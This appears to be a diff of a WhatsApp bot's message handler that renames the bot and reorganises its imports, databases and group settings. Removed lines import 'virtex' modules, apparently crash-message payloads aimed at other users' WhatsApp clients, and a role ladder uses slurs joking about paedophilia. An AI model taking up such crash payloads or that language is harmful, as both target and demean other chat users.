@@ -1,189 +1,229 @@
-require("./settings")
-const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, WAFlag } = require('@adiwajshing/baileys')
-const zMiku = require("@adiwajshing/baileys")
+
+require('./settings')
+const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
 const fs = require('fs')
 const util = require('util')
 const chalk = require('chalk')
 const { exec, spawn, execSync } = require("child_process")
 const axios = require('axios')
-const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
 const path = require('path')
+const fetch = require('node-fetch')
 const os = require('os')
-const { AnimeWallpaper } = require("anime-wallpaper")
- const { TiktokDownloader } = require('./lib/tiktokdl') 
+const maker = require('mumaker')
+const hx = require("hxz-api")
 const moment = require('moment-timezone')
 const { JSDOM } = require('jsdom')
 const speed = require('performance-now')
-const hx = require("hxz-api")
-const hxz = require('./lib/hxz-api')
-const bdr = require('rumus-bdr')
-const yogipw = require("tod-api")
-const { color, bgcolor } = require('./lib/color')
-const thiccysapi = require('textmaker-thiccy')
-const toHur = require('@develoka/angka-terbilang-js')
-const mathjs = require('mathjs')
 const { performance } = require('perf_hooks')
 const { Primbon } = require('scrape-primbon')
-const { EmojiAPI } = require("emoji-api")
-const imgbbUploader = require('imgbb-uploader')
 const primbon = new Primbon()
-const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./lib/limit.js');
-const emoji = new EmojiAPI()
-const { smsg, formatp, times, tanggal, GIFBufferToVideoBuffer, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
-const { aiovideodl } = require('./lib/scraper.js')
-const cheerio = require ("cheerio");
-const textpro = require('./lib/textpro')
-const { detikNews } = require('./lib/detik')
-const { wikiSearch } = require('./lib/wiki.js');
-const { Gempa } = require("./lib/gempa.js");
-const ms = require('ms')
- let { covid } = require('./lib/covid.js') 
-const { jadwaltv }= require('./lib/jadwaltv');
-const { MikuTiktok } = require('./lib/tiktokmikudl');
-const maker = require('mumaker')
-const xfarrapi = require('xfarr-api')
-const { hentai } = require('./lib/scraper2.js')
+const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
+const xeonkey = require('xfarr-api')
+const cheerio = require ("cheerio")
+const { XeonBotIncTiktok } = require('./lib/tiktokbyxeon')
 let { msgFilter } = require('./lib/antispam')
+let { covid } = require('./lib/covid.js') 
+const { EmojiAPI } = require("emoji-api")
+const emoji = new EmojiAPI()
+const thiccysapi = require('textmaker-thiccy')
+const { XeonBotIncWiki } = require('./lib/xeonywiki.js')
+const textpro = require('./lib/textpro')
 const { mediafireDl } = require('./lib/mediafire.js')
-const _ = require('lodash')
-const yargs = require('yargs/yargs')
-var low
-try {
-  low = require('lowdb')
-} catch (e) {
-  low = require('./lib/lowdb')
-}
+const { Gempa } = require("./lib/gempa.js")
+const { jadwaltv }= require('./lib/jadwaltv')
+const xeontod = require("tod-api")
+const { pinterest } = require("./lib/pinterest")
+const toHur = require('@develoka/angka-terbilang-js')
+const { hentai } = require('./lib/scraper2.js')
+const {
+ FajarNews, 
+ BBCNews,
+  metroNews,
+  CNNNews,
+  iNews,
+  KumparanNews,
+  TribunNews,
+  DailyNews,
+  DetikNews,
+  OkezoneNews,
+  CNBCNews,
+  KompasNews,
+  SindoNews,
+  TempoNews,
+  IndozoneNews,
+  AntaraNews,
+  RepublikaNews,
+  VivaNews,
+  KontanNews,
+  MerdekaNews,
+  KoXeonBotIncSearch,
+  AniPlanetSearch,
+  KomikFoxSearch,
+  KomikStationSearch,
+  MangakuSearch,
+  KiryuuSearch,
+  KissMangaSearch,
+  KlikMangaSearch,
+  PalingMurah,
+  LayarKaca21,
+  AminoApps,
+  Mangatoon,
+  WAModsSearch,
+  Emojis,
+  CoronaInfo,
+  JalanTikusMeme, 
+  Cerpen,
+  Quotes,
+  Couples,
+  Darkjokes
+} = require("dhn-api")
+//rpg function\\
+   const { 
+     addInventoriDarah, 
+      cekDuluJoinAdaApaKagaDiJson, 
+      addDarah, 
+      kurangDarah, 
+     getDarah 
+   }  = require('./storage/user/darah.js')
+   const { 
+     cekInventoryAdaAtauGak, 
+      addInventori,  
+       addBesi, 
+       addEmas, 
+       addEmerald,
+       addUmpan,
+       addPotion,
+       kurangBesi, 
+       kurangEmas, 
+       kurangEmerald, 
+       kurangUmpan,
+       kurangPotion,
+       getBesi, 
+      getEmas, 
+     getEmerald,
+     getUmpan,
+    getPotion
+   } = require('./storage/user/alat_tukar.js')
+   const { 
+    addInventoriMonay, 
+    cekDuluJoinAdaApaKagaMonaynyaDiJson, 
+    addMonay, 
+    kurangMonay, 
+   getMonay 
+   } = require('./storage/user/monay.js')
+   const { 
+    addInventoriLimit, 
+    cekDuluJoinAdaApaKagaLimitnyaDiJson, 
+    addLimit, 
+    kurangLimit, 
+    getLimit 
+   } = require('./storage/user/limit.js')
+   const { 
+    cekDuluHasilBuruanNya, 
+     addInventoriBuruan, 
+     addIkan,
+      addAyam, 
+      addKelinci, 
+      addDomba, 
+      addSapi,
+      addGajah,
+      kurangIkan,
+      kurangAyam, 
+      kurangKelinci, 
+      kurangDomba, 
+      kurangSapi,
+      kurangGajah,
+      getIkan,
+      getAyam, 
+      getKelinci, 
+      getDomba,
+     getSapi,
+    getGajah
+   } = require('./storage/user/buruan.js')
+   let DarahAwal =  global.rpg.darahawal
+   const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)   
+   const isCekDarah = getDarah(m.sender)
+   const isUmpan = getUmpan(m.sender)
+   const isPotion = getPotion(m.sender)
+   const isIkan = getIkan(m.sender)
+   const isAyam = getAyam(m.sender)
+   const isKelinci = getKelinci(m.sender)
+   const isDomba = getDomba(m.sender)
+   const isSapi = getSapi(m.sender)
+   const isGajah = getGajah(m.sender)
+   const isMonay = getMonay(m.sender)
+   const isLimit = getLimit(m.sender)
+   const isBesi = getBesi(m.sender)
+   const isEmas = getEmas(m.sender)
+   const isEmerald = getEmerald(m.sender)
+   const isInventory = cekInventoryAdaAtauGak(m.sender)
+   const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
+   const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
+   const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
+   const ikan = ['🐟','🐠','🐡']   
 
-const { Low, JSONFile } = low
-const mongoDB = require('./lib/mongoDB')
-const { 
-  yta, 
-  ytv, 
-  searchResult 
- } = require('./lib/ytdl')
-const { Darkjokes } = require("dhn-api")
+//rpg database\\
+ let _limit = JSON.parse(fs.readFileSync('./storage/user/limit.json'));
+ let _buruan = JSON.parse(fs.readFileSync('./storage/user/hasil_buruan.json'));
+ let _darahOrg = JSON.parse(fs.readFileSync('./storage/user/darah.json'))
 
+//Database omther\\
+let xeonysticker = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
+let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'));
+let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
+let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));
+let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
+const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'));
 let banUser = JSON.parse(fs.readFileSync('./database/banUser.json'));
 let banchat = JSON.parse(fs.readFileSync('./database/banChat.json'));
-
- let _limit = JSON.parse(fs.readFileSync('./storage/user/limit.json'));
- let _buruan = JSON.parse(fs.readFileSync('./storage/user/bounty.json'));
- let _darahOrg = JSON.parse(fs.readFileSync('./storage/user/blood.json'))
-
-
-global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
-global.db = new Low(
-  /https?:\/\//.test(opts['db'] || '') ?
-    new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ?
-      new mongoDB(opts['db']) :
-      new JSONFile(`src/database.json`)
-)
-global.DATABASE = global.db // Backwards Compatibility
-global.loadDatabase = async function loadDatabase() {
-  if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000))
-  if (global.db.data !== null) return
-  global.db.READ = true
-  await global.db.read()
-  global.db.READ = false
-  global.db.data = {
-    users: {},
-    chats: {},
-    database: {},
-    game: {},
-    settings: {},
-    others: {},
-    sticker: {},
-    ...(global.db.data || {})
-  }
-  global.db.chain = _.chain(global.db.data)
-}
-loadDatabase()
-global.db = JSON.parse(fs.readFileSync('./src/database.json'))
-if (global.db) global.db = {
-    sticker: {},
-    database: {},
-    game: {},
-    others: {},
-    users: {},
-    ...(global.db || {})
-}
-
+let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'))
+//
 let lolkey = global.lolhuman
-let tebaklagu = db.game.tebaklagu = []
-let _family100 = db.game.family100 = []
-let kuismath = db.game.math = []
-let tebakgambar = db.game.tebakgambar = []
-let tebakkata = db.game.tebakkata = []
-let caklontong = db.game.lontong = []
-let caklontong_desk = db.game.lontong_desk = []
-let tebakkalimat = db.game.kalimat = []
-let tebaklirik = db.game.lirik = []
-let tebaktebakan = db.game.tebakan = []
-let vote = db.others.vote = []
-let pendaftar = JSON.parse(fs.readFileSync('./storage/user/user.json'))
-let balance = JSON.parse(fs.readFileSync('./database/balance.json'))
-let ssewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
-let ban = JSON.parse(fs.readFileSync('./database/ban.json'))
-let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
-const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'))
-let _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
-let _level = JSON.parse(fs.readFileSync('./database/level.json'))
-let limit = JSON.parse(fs.readFileSync('./database/limit.json'))
-let setik = JSON.parse(fs.readFileSync('./src/sticker.json'))
-let vien = JSON.parse(fs.readFileSync('./src/audio.json'))
-let imagi = JSON.parse(fs.readFileSync('./src/image.json'))
-let videox = JSON.parse(fs.readFileSync('./src/video.json'))
-global.db = JSON.parse(fs.readFileSync('./src/database.json'))
-let _sewa = require("./lib/sewa");
-const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
+//read database\\
+let tebaklagu = db.data.game.tebaklagu = []
+let _family100 = db.data.game.family100 = []
+let kuismath = db.data.game.math = []
+let tebakgambar = db.data.game.tebakgambar = []
+let tebakkata = db.data.game.tebakkata = []
+let caklontong = db.data.game.lontong = []
+let caklontong_desk = db.data.game.lontong_desk = []
+let tebakkalimat = db.data.game.kalimat = []
+let tebaklirik = db.data.game.lirik = []
+let tebaktebakan = db.data.game.tebakan = []
+let vote = db.data.others.vote = []
 
+module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
+    try {
+        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
+        var budy = (typeof m.text == 'string' ? m.text : '')
+        var prefix = global.prefa
+        const isCmd = body.startsWith(prefix)
+        const command = isCmd ? body.slice(1).trim().split(' ')[0].toLowerCase() : ''
+        const args = body.trim().split(/ +/).slice(1)
+        const pushname = m.pushName || "No Name"
+        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
+        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const isMod = [botNumber, ...global.Mod].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const itsMe = m.sender == botNumber ? true : false
+        const text = q = args.join(" ")
+        const quoted = m.quoted ? m.quoted : m
+        const mime = (quoted.msg || quoted).mimetype || ''
+	    const isMedia = /image|video|sticker|audio/.test(mime)
+	    const from = mek.key.remoteJid
+	    const type = Object.keys(mek.message)[0]        
+	    const content = JSON.stringify(mek.message)
+	    const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
 
-const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
-const ucap = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
-var buln = ['/01/', '/02/', '/03/', '/04/', '/05/', '/06/', '/07/', '/08/', '/09/', '/10/', '/11/', '/12/'];
-var myHari = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
-var tgel = new Date();
-var hri = tgel.getDate();
-var bulnh = tgel.getMonth();
-var thisHari = tgel.getDay(),
-    thisDaye = myHari[thisHari];
-var yye = tgel.getYear();
-var syear = (yye < 1000) ? yye + 1900 : yye;
-const jangwak = (hri + '' + buln[bulnh] + '' + syear)
-const janghar = (thisDaye)
-
-module.exports = Miku = async (Miku, m, chatUpdate, store) => {
-try {
-var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
-var budy = (typeof m.text == 'string' ? m.text : '')
-const prefix = global.prefa
-const isCmd = body.startsWith(prefix)
-const notCmd = body.startsWith('')
-const command = isCmd ? body.slice(1).trim().split(' ')[0].toLowerCase() : ''
-const args = body.trim().split(/ +/).slice(1)
-const pushname = m.pushName || "No Name"
-const botNumber = await Miku.decodeJid(Miku.user.id)
-const isCreator = [botNumber, ...global.Owner, ...global.OwnerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-const itsMe = m.sender == botNumber ? true : false
-const text = args.join(" ")
-const from = m.chat
-const quoted = m.quoted ? m.quoted : m
-const mime = (quoted.msg || quoted).mimetype || ''
-const isMedia = /image|video|sticker|audio/.test(mime)
-const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
-const groupMetadata = m.isGroup ? await Miku.groupMetadata(m.chat).catch(e => {}) : ''
-const groupName = m.isGroup ? groupMetadata.subject : ''
-const participants = m.isGroup ? await groupMetadata.participants : ''
-const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
-const groupOwner = m.isGroup ? groupMetadata.owner : ''
-const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
-const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
-const isUser = pendaftar.includes(m.sender)
-const isBan = banUser.includes(m.sender)
-const isBanChat = m.isGroup ? banchat.includes(from) : false
-const isMod = [botNumber, ...global.Mod].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-const isRakyat = isCreator || global.rkyt.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
-const AntiLink = m.isGroup ? ntilink.includes(from) : false
+        //group\\
+        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
+        const groupName = m.isGroup ? groupMetadata.subject : ''
+        const participants = m.isGroup ? await groupMetadata.participants : ''
+        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
+        const groupOwner = m.isGroup ? groupMetadata.owner : ''
+    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
+    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
+    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
+        const AntiLink = m.isGroup ? ntilink.includes(from) : false
 const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
 const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
 const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
@@ -193,380 +233,50 @@ const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
 const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
 const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
 const antiWame = m.isGroup ? ntwame.includes(from) : false
+const antiToxic = m.isGroup ? nttoxic.includes(from) : false
 const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
 const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
-const isLeveling = m.isGroup ? _leveling.includes(from) : false
-autoreadsw = false
-const content = JSON.stringify(m.message)
-const q = args.join(' ')
-
-const isQuotedVideo = m.mtype === 'extendedTextMessage' && content.includes('videoMessage')
-const isQuotedAudio = m.mtype === 'extendedTextMessage' && content.includes('audioMessage')
-
-xeonbugpic = fs.readFileSync('./Rimed/xpic.jpeg')
-const { xeonbut2 } = require('./Rimed/xeonbut2')
-const { xeonvirtex } = require('./Rimed/rivirtex')
-const { xeonbutton } = require('./Rimed/xeonbutton')
-const { xeonbrutal } = require('./Rimed/virtex1')
-
-
-const mongoose = require("mongoose");
-
-
-const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
-        if(time2 < "23:59:00"){
-        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ'
-}
-        if(time2 < "17:00:00"){
-        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ sᴏʀᴇ'
-}
-        if(time2 < "15:00:00"){
-        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ sɪᴀɴɢ'
-}
-        if(time2 < "09:00:00"){
-        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
-}
-
-
-const reply = (teks) => {
-           Miku.sendMessage(m.chat, { text: teks},{ quoted: m})
-      }
-        
-        const replay = (teks) => {
-            Miku.sendMessage(m.chat, { text: teks}, { quoted: m})
-        }
-        
-
-function randomNomor(angka){
-            return Math.floor(Math.random() * angka) + 1
-            }
-            
+const isAutoStick = _autostick.includes(from)
+const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
+const Autoreply = m.isGroup ? autorep.includes(from) : true
+        const isBan = banUser.includes(m.sender)
+        const isBanChat = m.isGroup ? banchat.includes(from) : false
+autoreadsw = true
+	    
+        //member\\
+        let picaks = [flaming,fluming,flarun,flasmurf]
+		let picak = picaks[Math.floor(Math.random() * picaks.length)]
 		
-if (m.message) {
-addBalance(m.sender, randomNomor(574), balance)
-console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
-        }
-
-        if (isCmd && !isUser){
-			pendaftar.push(m.sender)
-			fs.writeFileSync('./storage/user/user.json', JSON.stringify(pendaftar))
-        } 
-
-            const getLevelingXp = (userId) => {
-            let position = false
-            Object.keys(_level).forEach((i) => {
-                if (_level[i].jid === userId) {
-                    position = i
-                }
-            })
-            if (position !== false) {
-                return _level[position].xp
-               }
+          try {
+            let isNumber = x => typeof x === 'number' && !isNaN(x)
+            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
+            let user = global.db.data.users[m.sender]
+            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
+            if (user) {
+                if (!isNumber(user.afkTime)) user.afkTime = -1
+                if (!('afkReason' in user)) user.afkReason = ''
+                if (!isNumber(user.limit)) user.limit = limitUser
+            } else global.db.data.users[m.sender] = {
+                afkTime: -1,
+                afkReason: '',
+                limit: limitUser,
             }
-
-            const getLevelingLevel = (userId) => {
-            let position = false
-            Object.keys(_level).forEach((i) => {
-                if (_level[i].jid === userId) {
-                    position = i
-                }
-            })
-            if (position !== false) {
-                return _level[position].level
-                }
+    
+            let chats = global.db.data.chats[m.chat]
+            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
+            if (chats) {
+                if (!('mute' in chats)) chats.mute = false
+            } else global.db.data.chats[m.chat] = {
+                mute: false,
             }
-
-            const getLevelingId = (userId) => {
-            let position = false
-            Object.keys(_level).forEach((i) => {
-                if (_level[i].jid === userId) {
-                    position = i
-                }
-            })
-            if (position !== false) {
-                return _level[position].jid
-                }
-             }
-
-            const addLevelingXp = (userId, amount) => {
-            let position = false
-            Object.keys(_level).forEach((i) => {
-                if (_level[i].jid === userId) {
-                    position = i
-                }
-            })
-            if (position !== false) {
-                _level[position].xp += amount
-                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
-                }
-            }
-
-            const addLevelingLevel = (userId, amount) => {
-            let position = false
-            Object.keys(_level).forEach((i) => {
-                if (_level[i].jid === userId) {
-                    position = i
-                }
-            })
-            if (position !== false) {
-                _level[position].level += amount
-                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
-                }
-            }
-
-            const addLevelingId = (userId) => {
-            const obj = {jid: userId, xp: 1, level: 1}
-            _level.push(obj)
-            fs.writeFileSync('./database/level.json', JSON.stringify(_level))
-            }
-
-            const getUserRank = (userId) => {
-    let position = null
-    let found = false
-    _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
-    Object.keys(_level).forEach((i) => {
-        if (_level[i].id === userId) {
-            position = i
-            found = true
-        }
-    })
-    if (found === false && position === null) {
-        const obj = { id: userId, xp: 0, level: 1 }
-        _level.push(obj)
-        fs.writeFileSync('./database/level.json', JSON.stringify(_level))
-        return 99
-    } else {
-        return position + 1
-    }
-}
-
-const xpGain = new Set()
-
-const isGained = (userId) => {
-    return !!xpGain.has(userId)
-}
-
-const addCooldown = (userId) => {
-    xpGain.add(userId)
-    setTimeout(() => {
-        return xpGain.delete(userId)
-    }, 60000) 
-}
-
-var levelRole = getLevelingLevel(m.sender)
-        var role = '👌👈Colikiawan👉👌'
-        if (levelRole <= 2) {
-            role = 'Pedopil'
-        } else if (levelRole <= 3) {
-            role = 'Babu'
-        } else if (levelRole <= 4) {
-            role = 'Copper II'
-        } else if (levelRole <= 20) {
-            role = 'Copper I'
-        } else if (levelRole <= 25) {
-            role = 'Silver V'
-        } else if (levelRole <= 30) {
-            role = 'Silver IV'
-        } else if (levelRole <= 35) {
-            role = 'Silver III'
-        } else if (levelRole <= 40) {
-            role = 'Silver II'
-        } else if (levelRole <= 45) {
-            role = 'Silver I'
-        } else if (levelRole <= 50) {
-            role = 'Gold V'
-        } else if (levelRole <= 55) {
-            role = 'Gold IV'
-        } else if (levelRole <= 60) {
-            role = 'Gold III'
-        } else if (levelRole <= 65) {
-            role = 'Gold II'
-        } else if (levelRole <= 70) {
-            role = '😶 Pesange Handal 😶'
-        } else if (levelRole <= 75) {
-            role = 'Platinum V'
-        } else if (levelRole <= 80) {
-            role = 'Platinum IV'
-        } else if (levelRole <= 85) {
-            role = 'Platinum III'
-        } else if (levelRole <= 90) {
-            role = 'Platinum II'
-        } else if (levelRole <= 95) {
-            role = 'Platinum I'
-        } else if (levelRole < 100) {
-            role = '😎 Kang Coli,Sange,Pendosa 😎'
-        } else if (levelRole < 912) {
-            role = '😎 Jester 😎'
-        } else if (levelRole < 1001) {
-            role = '*HeroSmile*'
-        } else if (levelRole < 1501) {
-            role = '💰 Soeltan 💰'
-        } else if (levelRole < 2001) {
-            role = '★ Loli Hunter ★'
-        } else if (levelRole < 2501) {
-            role = '🌟 Code Hunter 🌟'
-        } else if (levelRole < 7000) {
-            role = '🤭 Pedofil,Sangean,Kang coli,Stress,Agak belok. 🤭'
-        } else if (levelRole < 10000) {
-            role = '★ Loli Hunter ★'
-        } else if (levelRole < 1000000) {
-            role = '💦Paha Namba Wan💦'
-        } else if (levelRole < 99999999999999) {
-            role = '*🌟 Shiodome Miuna 🌟*'
-        }
-
-
-        var levelRoles = getLevelingLevel(m.sender)
-        var roles = 'Cop V'
-        if (levelRoles <= 5) {
-            roles = 'Cop IV'
-        } else if (levelRoles <= 10) {
-            roles = 'Cop III'
-        } else if (levelRoles <= 15) {
-            roles = 'Cop II'
-        } else if (levelRoles <= 20) {
-            roles = 'Cop I'
-        } else if (levelRoles <= 25) {
-            roles = 'Sil V'
-        } else if (levelRoles <= 30) {
-            roles = 'Sil IV'
-        } else if (levelRoles <= 35) {
-            roles = 'Sil III'
-        } else if (levelRoles <= 40) {
-            roles = 'Sil II'
-        } else if (levelRoles <= 45) {
-            roles = 'Sil I'
-        } else if (levelRoles <= 50) {
-            roles = 'Gol V'
-        } else if (levelRoles <= 55) {
-            roles = 'Gol IV'
-        } else if (levelRoles <= 60) {
-            roles = 'Gol III'
-        } else if (levelRoles <= 65) {
-            roles = 'Gol II'
-        } else if (levelRoles <= 70) {
-            roles = 'Gol I'
-        } else if (levelRoles <= 75) {
-            roles = 'Plat V'
-        } else if (levelRoles <= 80) {
-            roles = 'Plat IV'
-        } else if (levelRoles <= 85) {
-            roles = 'Plat III'
-        } else if (levelRoles <= 90) {
-            roles = 'Plat II'
-        } else if (levelRoles <= 95) {
-            roles = 'Plati I'
-        } else if (levelRoles < 100) {
-            roles = 'Exter'
-        }
-   
-                        if (m.isGroup && isLeveling && isUser && Miku.public) {
-                                const currentLevel = getLevelingLevel(m.sender)
-                                const checkId = getLevelingId(m.sender)
-                                try {
-                                        addCooldown(m.sender)
-                                        if (currentLevel === undefined && checkId === undefined) addLevelingId(m.sender)
-                                        const amountXp = Math.floor(Math.random() * 10) + 200
-                                        const requiredXp = 200 * (Math.pow(2, currentLevel) - 1)
-                                        const getLevel = getLevelingLevel(m.sender)
-                                        addLevelingXp(m.sender, amountXp)
-                                        if (requiredXp <= getLevelingXp(m.sender)) {
-                                        addLevelingLevel(m.sender, 1)
-teks = `「 *User Level UP* 」\n\n@${m.sender.split("@")[0]} got leveled up!!\n\n*User XP*: ${getLevelingXp(m.sender)}\n*Level*: ${getLevel} -> ${getLevelingLevel(m.sender)}\n*Role*: ${role} \n\n`
-Miku.sendMessage(m.chat, {text: teks, mentions:[m.sender]}, {quoted:m})
-}
-
-                        } catch (err) {
-                                console.error("❌ An error occured !")
-                        }
-                }
-                if (prefix && command) {
-                                const currentLevel = getLevelingLevel(m.sender)
-                                const checkId = getLevelingId(m.sender)
-                                try {
-                                        
-                                        if (currentLevel === undefined && checkId === undefined) addLevelingId(m.sender)
-                                        const amountXp = Math.floor(Math.random() * 10) + 30
-                                        const requiredXp = 30 * (Math.pow(2, currentLevel) - 1)
-                                        const getLevel = getLevelingLevel(m.sender)
-                                        addLevelingXp(m.sender, amountXp)
-                                        if (requiredXp <= getLevelingXp(m.sender)) {
-                                        addLevelingLevel(m.sender, 1)
-                                        }
-                                        
-                        } catch (err) {
-                                console.error("❌ An error occured !")
-                        }
-                }
-
-if (autoreadsw) {
-		if (from === 'status@broadcast') {
-		Miku.chatRead(from)
-	}
-	}
-
-if (global.autoreadpmngc) {
-if (command) {
-await Miku.sendPresenceUpdate('composing', m.chat)
-Miku.sendReadReceipt(from, m.sender, [m.key.id])}
-}
-/*
-  if (global.autoReadGc) {
-  if (m.isGroup) { Miku.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
-}
-*/
-
-  if (global.autoReadAll) { if (m.chat) { Miku.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
-  }
-
-    if (global.autoRecord) { if (m.chat) { Miku.sendPresenceUpdate('recording', m.chat) }
-}
-
-  if (global.autoTyping) { if (m.chat) { Miku.sendPresenceUpdate('composing', m.chat) }
-}
-
-  if (global.available) { if (m.chat) { Miku.sendPresenceUpdate('available', m.chat) }
-  }
-
-const hariRaya = new Date('6 1, 2022 00:00:00')
-			const sekarang = new Date().getTime();
-			const Selisih = hariRaya - sekarang;
-			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
-			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
-			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
-			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
-			const ultah = `${jhari}Day ${jjam}Hour ${mmmenit}Minute ${ddetik}Second`
-			
-async function hitungmundur(bulan, tanggal) { 
-          let from = new Date(`${bulan} ${tanggal}, 2022 00:00:00`).getTime();
-          let now = Date.now();
-          let distance = from - now;
-          let days = Math.floor(distance / (1000 * 60 * 60 * 24));
-          let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-          let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
